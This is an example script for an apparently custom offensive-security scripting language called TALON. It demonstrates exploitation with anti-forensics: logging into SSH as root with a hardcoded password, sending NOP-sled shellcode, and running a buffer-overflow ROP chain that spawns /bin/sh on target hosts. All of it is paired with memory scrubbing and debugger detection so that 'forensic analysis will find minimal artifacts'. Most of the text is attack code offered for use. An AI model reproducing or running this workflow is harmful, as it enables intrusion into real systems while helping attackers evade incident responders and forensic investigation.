# Memory Scrubbing and Anti-Forensics Example
#
# This example demonstrates how TALON's memory scrubbing prevents forensic
# artifact recovery after sensitive operations.
#
# Features:
# - SecureString: Auto-zeroing strings for credentials
# - Automatic payload scrubbing after send()
# - Shellcode memory cleanup after execution
# - Anti-debugging detection
# - DPAPI credential encryption (Windows only)

# Example 1: Using SecureString for credentials
# Note: In production code, SecureString would be used internally by the interpreter
# to handle SSH passwords, API keys, etc.

let target = "192.168.1.100"
let port = 22

# Connect to SSH (password is stored in SecureString internally)
# Memory is automatically zeroed after authentication
let ssh = connect_ssh(target, port, "root", "SecretPassword123")

# Example 2: Automatic payload scrubbing
# When you send an exploit payload, TALON automatically:
# 1. Sends the payload over the network
# 2. Zeros the payload buffer in memory
# 3. Prevents memory dump recovery

let conn = connect(target, 4444)

# This payload will be automatically scrubbed from memory after sending
let nop_sled = "\x90\x90\x90\x90"  # NOP sled (will be converted to bytes internally)
let sc = shellcode("sh")  # Add shellcode
let payload = nop_sled + sc

send(conn, payload)  # Payload is automatically zeroed in memory after this

# Example 3: Credential handling with DPAPI (Windows only)
# On Windows, credentials can be encrypted using DPAPI
# This ensures they can only be decrypted by the same user on the same machine

# Note: This would be handled internally by the interpreter
# For demonstration purposes only:
# let encrypted_cred = dpapi_encrypt("my_api_key_12345")
# # ... store encrypted_cred in config file
# let decrypted_cred = dpapi_decrypt(encrypted_cred)
# # decrypted_cred is stored in SecureString and auto-zeroed

# Example 4: Anti-debugging detection
# TALON can detect debuggers and memory dumping tools

# This would be checked internally by the interpreter
# If a debugger is detected, sensitive operations can be aborted
# 
# check_debugger()  # Throws error if debugger detected
# check_memory_dumping()  # Throws error if dumping tool detected

# Example 5: Memory locking for ultra-sensitive data
# SecureString can lock memory pages to prevent swapping to disk

# Note: Handled internally for credentials
# For demonstration:
# let secret = SecureString::new("ultra_secret_data")
# secret.lock()  # Lock memory (prevent swap to disk)
# # ... use secret
# secret.unlock()  # Unlock when done
# # Memory is auto-zeroed on drop

# Example 6: Shellcode execution with auto-scrubbing
# When shellcode is executed, TALON:
# 1. Allocates executable memory
# 2. Copies shellcode to memory
# 3. Executes it
# 4. Zeros the original shellcode buffer
# 5. Zeros the allocated memory after execution

let sc = shellcode("execve", args="/bin/sh")
# execute_shellcode(sc)  # Shellcode is scrubbed from memory after execution

# Example 7: Complete exploitation workflow with automatic scrubbing

# Target binary
let target_host = "192.168.1.50"
let target_port = 9999

# Connect
let conn = connect(target_host, target_port)

# Build ROP chain (will be scrubbed after sending)
let rop = RopChain()
rop.add_gadget(0x400123)  # pop rdi; ret
rop.add_gadget(0x601234)  # address of "/bin/sh"
rop.add_gadget(0x400567)  # system()

# Build payload (will be scrubbed after sending)
let overflow = "A" * 128  # Buffer overflow
let payload_final = overflow + p64(rop)  # ROP chain

# Send payload - automatically scrubbed from memory after this line
sendline(conn, payload_final)

# Receive shell
let response = recvline(conn)  # Receive until newline
print("Got shell!")

# Close connection
close(conn)

# At this point, all sensitive data has been scrubbed:
# - The password used for SSH
# - The exploit payload
# - The ROP chain
# - The shellcode

print("[+] Exploitation complete")
print("[+] All sensitive data scrubbed from memory")
print("[+] Forensic analysis will find minimal artifacts")
